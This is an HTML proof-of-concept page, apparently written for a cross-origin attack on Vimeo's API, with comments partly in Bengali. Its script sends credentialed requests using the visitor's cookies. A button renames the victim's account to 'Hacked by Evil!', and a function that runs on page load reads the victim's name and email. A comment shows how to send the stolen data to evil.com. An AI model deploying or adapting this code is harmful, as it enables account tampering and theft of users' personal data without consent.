<!DOCTYPE html>
<html>
<head><title>Evil Vimeo Tool</title></head>
<body>
    <h1>Click to Update Your Vimeo Name!</h1>
    <button onclick="exploitVimeo()">Update Name to "Hacked by Evil!"</button>
    <div id="result"></div>

    <script>
    async function exploitVimeo() {
        const resultDiv = document.getElementById('result');
        try {
            // PATCH request to update name
            const response = await fetch('https://api.vimeo.com/me?fields=name', {
                method: 'PATCH',
                headers: {
                    'Authorization': 'Bearer YOUR_JWT_TOKEN_HERE',  // যদি JWT manually দরকার (dev tools থেকে copy), নাহলে omit—cookie auto যাবে
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.vimeo.*; version=3.4.2'
                },
                credentials: 'include',  // Cookies/JWT auto-send
                body: JSON.stringify({ name: 'Hacked by Evil!' })
            });

            if (response.ok) {
                const data = await response.json();
                resultDiv.innerHTML = `<p>Success! New name: ${data.name}</p>`;
            } else {
                resultDiv.innerHTML = `<p>Error: ${response.status}</p>`;
            }
        } catch (error) {
            resultDiv.innerHTML = `<p>CORS Exploit Failed: ${error.message}</p>`;
        }
    }

    // Auto-run on load: Steal user info
    async function stealUserInfo() {
        try {
            const response = await fetch('https://api.vimeo.com/me?fields=name,email', {
                credentials: 'include',
                headers: { 'Accept': 'application/vnd.vimeo.*; version=3.4.2' }
            });
            const data = await response.json();
            // Real attack-এ: data attacker server-এ send (e.g., fetch('https://evil.com/log', {method:'POST', body:JSON.stringify(data)}))
            console.log('Stolen Data:', data);  // Console-এ দেখো test-এর জন্য
        } catch (e) { console.log('Steal Failed:', e); }
    }
    stealUserInfo();  // Page load-এ auto run
    </script>
</body>
</html>
